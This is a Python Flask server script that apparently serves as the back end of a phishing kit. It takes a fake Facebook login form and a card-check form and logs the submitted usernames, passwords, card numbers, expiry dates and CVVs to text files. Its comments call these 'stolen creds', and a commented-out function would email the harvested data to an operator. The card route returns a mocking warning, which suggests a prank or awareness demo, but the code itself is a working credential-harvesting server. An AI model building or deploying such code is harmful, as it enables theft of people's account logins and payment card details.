from funky import send_mail_to_Tyrion   #line 29 or look for send_mail_to_Tyrion() function
from flask import *



app = Flask("my API server", static_url_path='')


@app.route('/fb_to_save <name>, <password>') #saving stolen creds to file fb_log.txt
def fb_to_save(name, password):
   try:
      with open('fb_log.txt' ,'a') as f:
         f.write(f'username: {name} with pass: {password}\n-------------\n')
   except:
      with open('fb_log.txt' ,'w') as f:
         f.write(f'username: {name} with pass: {password}\n-------------\n')

   return 'Thank You. Go Back to try something else.'

@app.route('/cc_to_save <owner>,<card_num>,<edate>,<cvv>') #saving stolen creds to file cc_to_save.txt
def cc_to_save(owner, card_num, edate, cvv):

   try:
      with open('cc_log.txt' ,'a') as f:
         f.write(f'Owner: {owner} Card Number: {card_num} Expiration Date: {edate} CVV: {cvv}\n-------------\n')
   except:
      with open('cc_log.txt' ,'w') as f:
         f.write(f'Owner: {owner} Card Number: {card_num} Expiration Date: {edate} CVV: {cvv}\n-------------\n')
   #send_mail_to_Tyrion()  # and sending mail to Tyrion Lannister. Uncomment this function if you configured right send_mail_to_Tyrion() in funky.py
   return 'Seriously?! ' \
          'I am not gonna even check the data you entered, ' \
          'but angry report will be sent to Master of coin. ' \
          'Do not EVER enter your sensitive data to suspicious sites.'




@app.route('/htmltest1' ,methods = ['POST', 'GET'])
def login():
   if request.form['btn_identifier'] == 'Login':   # first form getting input
      if request.method == 'POST':
         user = request.form['email']
         password = request.form['password']
         return redirect(url_for('fb_to_save', name=user, password=password))
      else:
         user = request.args.get('name')
         password = request.args.get('password')
         return redirect(url_for('fb_to_save' ,name = user ,password=password))
   elif request.form['btn_identifier'] == 'Check':  # second form getting input
      if request.method == 'POST':
         owner = request.form['owner']
         card_num = request.form['card_num']
         edate = request.form['edate']
         cvv = request.form['cvv']
         return redirect(url_for('cc_to_save', owner=owner, card_num=card_num, edate=edate, cvv=cvv))
      else:
         owner = request.args.get('owner')
         card_num = request.args.get('card_num')
         edate = request.args.get('edate')
         cvv = request.args.get('cvv')
         return redirect(url_for('cc_to_save', owner=owner, card_num=card_num, edate=edate, cvv=cvv))


debug = True
app.run(host='0.0.0.0', port=1337, debug=debug)



